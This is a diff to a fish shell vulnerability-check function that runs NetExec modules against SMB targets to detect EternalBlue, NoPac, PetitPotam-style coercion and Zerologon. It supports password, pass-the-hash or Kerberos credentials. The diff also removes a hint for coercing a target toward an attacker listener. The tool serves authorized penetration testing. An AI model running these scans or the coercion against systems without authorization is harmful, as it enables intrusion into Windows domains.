@@ -39,40 +39,66 @@ Usage: checkvulns -t <target> -u <user> [-p <password> | -H <hash>] [-k] [-d dom
         return 1
     end
 
-    # Build authentication string
+    # Build authentication arguments
     set auth_args
-    if set -q _flag_domain
-        set auth_args "$_flag_domain\\$_flag_user"
-    else
-        set auth_args "$_flag_user"
-    end
+    
+    # Only add authentication if user is provided
+    if set -q _flag_user
+        set -a auth_args -u
+        if set -q _flag_domain
+            set -a auth_args "$_flag_domain\\$_flag_user"
+        else
+            set -a auth_args "$_flag_user"
+        end
 
-    if set -q _flag_password
-        set -a auth_args -p "$_flag_password"
-    else if set -q _flag_hash
-        set -a auth_args -H "$_flag_hash"
-    end
+        if set -q _flag_password
+            set -a auth_args -p "$_flag_password"
+        else if set -q _flag_hash
+            set -a auth_args -H "$_flag_hash"
+        end
 
-    if set -q _flag_kerb
-        set -a auth_args -k
-    end
-
-    # Create temporary file for coerce results
-    set coerce_tmp (mktemp)
-    function cleanup --on-event fish_exit
-        rm -f $coerce_tmp
+        if set -q _flag_kerb
+            set -a auth_args -k
+        end
     end
 
     trap "echo ''" INT
 
     # Set timeout for vulnerability checks
-    set -x timeout_secs 600
+    set -x timeout_secs 60
 
     function _check_single_target
         set target $argv[1]
         set auth_string $argv[2..-1]
 
         ezpz_title "Checking for vulnerabilities on $target"
+
+        # Test SMB connection first
+        set smb_test_output (timeout $timeout_secs nxc smb $target $auth_string 2>/dev/null)
+        
+        # Check if connection failed based on different scenarios
+        set should_skip 0
+        
+        # If no credentials provided, only skip if output is completely empty
+        if test (count $auth_string) -eq 0
+            if test -z "$smb_test_output"
+                set should_skip 1
+                ezpz_warn "SMB connection failed for $target (no response). Skipping."
+            end
+        else
+            # If credentials provided, check for authentication failures
+            if echo "$smb_test_output" | grep -q "\[-\]"
+                set should_skip 1
+                ezpz_warn "SMB authentication failed for $target. Skipping."
+            else if test -z "$smb_test_output"
+                set should_skip 1
+                ezpz_warn "SMB connection failed for $target (no response). Skipping."
+            end
+        end
+        
+        if test $should_skip -eq 1
+            return
+        end
 
         # EternalBlue (MS17-010)
         ezpz_header "EternalBlue (MS17-010)"
@@ -92,20 +118,22 @@ Usage: checkvulns -t <target> -u <user> [-p <password> | -H <hash>] [-k] [-d dom
 
         # NoPac (CVE-2021-42278)
         ezpz_header "NoPac (CVE-2021-42278)"
-        ezpz_cmd "nxc smb $target $auth_string -M nopac"
-        timeout $timeout_secs nxc smb $target $auth_string -M nopac | grep -a 'NOPAC' | tr -s " " | cut -d " " -f 5- | tr -s '\n'
-        if test $status -eq 124
-            ezpz_warn "Timeout reached while testing NoPac on $target"
+        if test (count $auth_string) -eq 0
+            echo "NoPac requires valid credentials to test. Skipping."
+        else
+            ezpz_cmd "nxc smb $target $auth_string -M nopac"
+            timeout $timeout_secs nxc smb $target $auth_string -M nopac | grep -a 'NOPAC' | tr -s " " | cut -d " " -f 5- | tr -s '\n'
+            if test $status -eq 124
+                ezpz_warn "Timeout reached while testing NoPac on $target"
+            end
         end
 
         # Coerce Attacks (PetitPotam, etc.)
         ezpz_header "Coerce Attacks (PetitPotam, etc.)"
         ezpz_cmd "nxc smb $target $auth_string -M coerce_plus"
-        timeout $timeout_secs nxc smb $target $auth_string -M coerce_plus | grep -a 'COERCE' | tr -s " " | cut -d " " -f 5- | tee $coerce_tmp
+        timeout $timeout_secs nxc smb $target $auth_string -M coerce_plus | grep -a 'COERCE' | tr -s " " | cut -d " " -f 5- | tr -s '\n'
         if test $status -eq 124
             ezpz_warn "Timeout reached while testing Coerce on $target"
-        else if grep -q "VULNERABLE" $coerce_tmp
-            ezpz_info "Try: nxc smb $target $auth_string -M coerce_plus -o LISTENER=\$kali"
         end
 
         # Zerologon (CVE-2020-1472)
@@ -120,10 +148,10 @@ Usage: checkvulns -t <target> -u <user> [-p <password> | -H <hash>] [-k] [-d dom
     # Process target(s)
     if test -f "$_flag_target"
         while read -l target
-            _check_single_target $target -u $auth_args
+            _check_single_target $target $auth_args
         end < $_flag_target
     else
-        _check_single_target $_flag_target -u $auth_args
+        _check_single_target $_flag_target $auth_args
     end
 
     trap - INT
